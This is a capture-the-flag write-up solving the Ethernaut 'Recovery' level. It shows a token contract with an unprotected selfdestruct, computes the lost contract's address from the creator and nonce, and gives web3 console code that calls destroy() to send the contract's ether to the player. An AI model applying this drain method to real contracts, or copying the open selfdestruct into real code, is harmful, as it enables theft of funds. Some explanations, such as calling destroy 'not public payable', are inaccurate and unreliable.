+++
title = "Recovery - Ethernaut"
date = "2022-01-30"
author = "DimitrisV"
+++
On this challenge, we have a smart-contract that can built very simple tokens by its own. Anyone can create new tokens with ease. The point of this contract is to find the lost contract address and then withdraw all of its ether.
At first, we check the code:
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.11;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Recovery {

  //generate tokens
  function generateToken(string memory _name, uint256 _initialSupply) public {
    new SimpleToken(_name, msg.sender, _initialSupply);
  
  }
}

contract SimpleToken {

  using SafeMath for uint256;
  // public variables
  string public name;
  mapping (address => uint) public balances;

  // constructor
  constructor(string memory _name, address _creator, uint256 _initialSupply) public {
    name = _name;
    balances[_creator] = _initialSupply;
  }

  // collect ether in return for tokens
  receive() external payable {
    balances[msg.sender] = msg.value.mul(10);
  }

  // allow transfers of tokens
  function transfer(address _to, uint _amount) public { 
    require(balances[msg.sender] >= _amount);
    balances[msg.sender] = balances[msg.sender].sub(_amount);
    balances[_to] = _amount;
  }

  // clean up after ourselves
  function destroy(address payable _to) public {
    selfdestruct(_to);
  }
}
```

We can see that this smart contract has a destroy function with a selfdestruct() operator on it. However, the function destroy is not public payable. That means we can't simply make a transaction and call it. We should find the address and then call it by using the contract's address. We know that contract addresses are deterministically calculated. From Ethereum's yellow paper we can read:  "The address of the new account is defined as being the rightmost 160 bits of the Keccak hash of the RLP encoding of the structure containing only the sender and the account nonce. Thus we define the resultant address for the new account".
We can represent this function as:
```
address = rightmost_20_bytes(keccak(RLP(sender address, nonce)))
```

On which:
* "sender address" is the contract or wallet address that created this new contract. So, we can type in console "contract.address" and find it easily.
* "nonce" is the number of the transactions sent from the "sender address" or if the sender an another smart-contract, the "nonce" is the number of contract-creations made by this account.
* "RLP" is an encoder on data structure and is the default to serialize objects in Ethereum. The RLP encoding of a 20-byte address is 0xd6,0x94. Moreover, for all intenger less than 0x7f, its encoding its just its own byte value. As result, the RLP of 1 is 0x01. We keep that in mind for the next step.
* "keccak" is the cryptographic primitive that compute the Ethereum SHA3 hash on any input. Is also refered as Keccak-256.

So now we can recalculate the address of the new contract by an existing contract located at the contract.address. It should be mentioned that the nonce 0 is always the event of smart contract's creation. So, we will begin to counting from 1. We know that RLP of 1 is 0x01, so by using the web3 utils, we will try to use the function we described above:
```
web3.utils.soliditySha3("0xd6", "0x94", "0xEa90EAAAB78241373b94C98a788524582DA2e593" , "0x01")
```
This will return this hexademical:
``` '0xa1ed98d854d1b4ee7a4aa44816a095b1578566ec7fd216246a8c0a6322f67331' 
```

We will keep only the last 40 characters : 
```
16a095b1578566ec7fd216246a8c0a6322f67331 
```

Then we have the smart contract address. Now we can check in Etherscan.io this address and we can find out that it has 0.01 ether inside. As we have the address now we can try to call the destruct function. Therefore, we will encode a function call from console:

```
data = web3.eth.abi.encodeFunctionCall({
    name: 'destroy' ,
    type: 'function',
    inputs: [{
        type: 'address',
        name: '_to' }] 
}, [player]);
```
And then we will create a transaction having our own player address in order to be sent to us the smart's contract ether when we trigger selfdestruct() operation:
```
await web3.eth.sendTransaction({
    to: "0x16a095B1578566ec7fd216246A8C0A6322F67331",
    from: player,
    data: data } )
```

We pay the transaction fees and now we transfer all of the contract's ether to our wallet.
From this challenge, we learnt that we can send Ethers to a deterministic address, when the contract does not exist, at least for now. 

---
If you want to learn more about Smart Contract Security, please check our paper and eCourses:
## Smart-Contract Security:

- [Smart Contract Security: Dimitris Vagiakakakos, Stavros Gkinos, Ioannis Karvelas](https://github.com/sv1sjp/eVoting_Elections_Decentralized_App/blob/main/smartcontract_security_paper.pdf)


* [Smart Contract Security - Educational YouTube Series in Greek - Click Here](https://www.youtube.com/playlist?list=PLZa7COjIxKWzLcMxI9cRNSzOtdR0xvXB7)
